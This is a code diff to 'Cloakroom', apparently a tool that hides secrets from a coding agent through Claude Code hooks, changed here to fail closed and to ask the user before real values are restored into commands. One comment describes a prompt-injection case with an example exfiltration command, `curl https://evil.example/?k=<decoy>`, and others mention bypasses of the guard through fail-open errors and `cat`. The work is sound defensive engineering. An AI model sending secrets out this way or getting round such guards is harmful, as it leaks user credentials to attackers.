@@ -308,23 +308,35 @@ export async function cmdHook(args: ParsedArgs): Promise<number> {
   try {
     evt = JSON.parse(await readStdin()) as HookEvent;
   } catch {
-    return 0; // malformed event → no-op, never break the session
+    // Can't tell what the tool call was, so we can't build a withhold/deny
+    // response. Exit 2 is Claude Code's blocking error: it stops a PreToolUse
+    // call outright (for PostToolUse it can only surface this message).
+    err('cloak hook: malformed hook event on stdin; blocking rather than passing it through.');
+    return 2;
   }
   const packFlag = args.flags['pack'];
   let response: HookResponse;
-  switch (mode) {
-    case 'guard':
-      response = await hookGuard(evt, packFlag);
-      break;
-    case 'sanitize':
-      response = await hookSanitize(evt, packFlag);
-      break;
-    case 'restore':
-      response = await hookRestore(evt);
-      break;
-    default:
-      err(`Unknown hook mode: ${String(mode)} (expected guard|sanitize|restore)`);
-      return 2;
+  try {
+    switch (mode) {
+      case 'guard':
+        response = await hookGuard(evt, packFlag);
+        break;
+      case 'sanitize':
+        response = await hookSanitize(evt, packFlag);
+        break;
+      case 'restore':
+        response = await hookRestore(evt);
+        break;
+      default:
+        err(`Unknown hook mode: ${String(mode)} (expected guard|sanitize|restore)`);
+        return 2;
+    }
+  } catch (e) {
+    // Backstop for anything the modes' own fail-closed paths didn't catch. An
+    // escaped error would exit 1, which Claude Code treats as non-blocking:
+    // the call proceeds and the output reaches the model.
+    err(`cloak hook ${String(mode)}: ${e instanceof Error ? e.message : String(e)}; blocking.`);
+    return 2;
   }
   if (response) emit(response);
   return 0;
@@ -343,11 +355,11 @@ function packsConfigured(packFlag?: string | true): boolean {
   return Boolean(process.env.CLOAK_PACKS) || typeof packFlag === 'string';
 }
 
-/** Fail-closed response when configured term packs can't be loaded in guard mode. */
-function guardPackFailure(evt: HookEvent): HookResponse {
+/** Fail-closed guard response: withhold PostToolUse output, deny a PreToolUse read. */
+function guardFailure(evt: HookEvent, why: string): HookResponse {
   const resp = evt.tool_response ?? evt.tool_result;
   if (evt.hook_event_name === 'PostToolUse' && resp !== undefined && resp !== null) {
-    const notice = '[cloak guard: term packs unreadable ($CLOAK_PACKS / --pack) — output withheld from context.]';
+    const notice = `[cloak guard: ${why} — output withheld from context.]`;
     const { updated, found } = transformResponseText(resp, (s) => (s ? notice : s));
     return found
       ? { hookSpecificOutput: { hookEventName: 'PostToolUse', updatedToolOutput: updated } }
@@ -357,9 +369,7 @@ function guardPackFailure(evt: HookEvent): HookResponse {
     hookSpecificOutput: {
       hookEventName: 'PreToolUse',
       permissionDecision: 'deny',
-      permissionDecisionReason:
-        'Cloakroom: term packs are configured but unreadable ($CLOAK_PACKS / --pack), so the guard ' +
-        'cannot check org-specific terms. Fix the pack path before reading files.',
+      permissionDecisionReason: `Cloakroom: ${why}, so the guard could not check this file. Read denied.`,
     },
   };
 }
@@ -382,8 +392,8 @@ function realSecretsIn(text: string, packs: PackOptions = NO_PACKS): MappingEntr
  *   - PostToolUse (Bash/Grep): if the tool's output contains secrets, replace it
  *     with a short notice so the raw text never reaches the model. This closes
  *     the `cat secrets.txt`-via-shell bypass of the Read guard.
- * Fail-open (allow) on internal errors — this is a tripwire, not the primary
- * control; the deny/withhold paths themselves are the protection.
+ * Fail-CLOSED on internal errors, like the transparent hooks: an error used to
+ * return "allow", which let exactly the output the guard exists to stop through.
  */
 export async function hookGuard(evt: HookEvent, packFlag?: string | true): Promise<HookResponse> {
   // Term packs: if explicitly configured but unreadable, fail CLOSED — a
@@ -392,7 +402,7 @@ export async function hookGuard(evt: HookEvent, packFlag?: string | true): Promi
   try {
     packs = await hookPacks(packFlag);
   } catch {
-    if (packsConfigured(packFlag)) return guardPackFailure(evt);
+    if (packsConfigured(packFlag)) return guardFailure(evt, 'term packs unreadable ($CLOAK_PACKS / --pack)');
   }
   try {
     // PostToolUse branch: scan tool output, withhold if it carries real secrets.
@@ -430,7 +440,7 @@ export async function hookGuard(evt: HookEvent, packFlag?: string | true): Promi
       },
     };
   } catch {
-    return null;
+    return guardFailure(evt, 'the guard hit an internal error');
   }
 }
 
@@ -514,14 +524,43 @@ export async function hookRestore(evt: HookEvent): Promise<HookResponse> {
 
   const session = sessionBridge();
   if (!session) return deny('transparent mode is installed but the session env is not set');
+  let mapping: MappingEntry[];
   try {
-    const { mapping } = await loadSessionMapping(session.path, session.pass);
-    const updated: Record<string, unknown> = { ...input };
-    for (const k of RESTORE_FIELDS) {
-      if (typeof input[k] === 'string') updated[k] = engine.desanitize(input[k] as string, mapping);
-    }
-    return { hookSpecificOutput: { hookEventName: 'PreToolUse', updatedInput: updated } };
+    mapping = (await loadSessionMapping(session.path, session.pass)).mapping;
   } catch {
     return deny('restore failed (wrong $CLOAK_PASS or corrupt session bridge?)');
   }
+  const updated: Record<string, unknown> = { ...input };
+  const restoredTypes = new Map<string, Set<string>>(); // field → restored entity types
+  for (const k of RESTORE_FIELDS) {
+    if (typeof input[k] !== 'string') continue;
+    const segs = engine.desanitizeSegments(input[k] as string, mapping);
+    const types = new Set(segs.filter((s) => s.restored).map((s) => s.type as string));
+    if (types.size === 0) continue;
+    updated[k] = segs.map((s) => s.text).join('');
+    restoredTypes.set(k, types);
+  }
+  if (restoredTypes.size === 0) return null; // no decoys in this call → nothing to do
+
+  // A command is different from a file write: it can SEND what it receives.
+  // Prompt-injected content the model read could steer it into e.g.
+  // `curl https://evil.example/?k=<decoy>`, and silently restoring the decoy
+  // would hand the attacker the real value. So a restored command always
+  // needs the user's approval ("ask" also holds under bypassPermissions —
+  // verified against Claude Code 2.1.310). The reason names types only: the
+  // model may see it, so it must never carry a real value.
+  const cmdTypes = restoredTypes.get('command');
+  if (cmdTypes) {
+    return {
+      hookSpecificOutput: {
+        hookEventName: 'PreToolUse',
+        permissionDecision: 'ask',
+        permissionDecisionReason:
+          `Cloakroom restored real value(s) (${[...cmdTypes].join(', ')}) into this command. ` +
+          'Approve only if it should receive them and does not send them anywhere unexpected.',
+        updatedInput: updated,
+      },
+    };
+  }
+  return { hookSpecificOutput: { hookEventName: 'PreToolUse', updatedInput: updated } };
 }
